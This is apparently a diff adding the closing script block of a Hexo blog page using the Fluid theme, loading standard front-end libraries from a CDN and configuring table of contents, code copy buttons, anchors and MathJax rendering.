+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
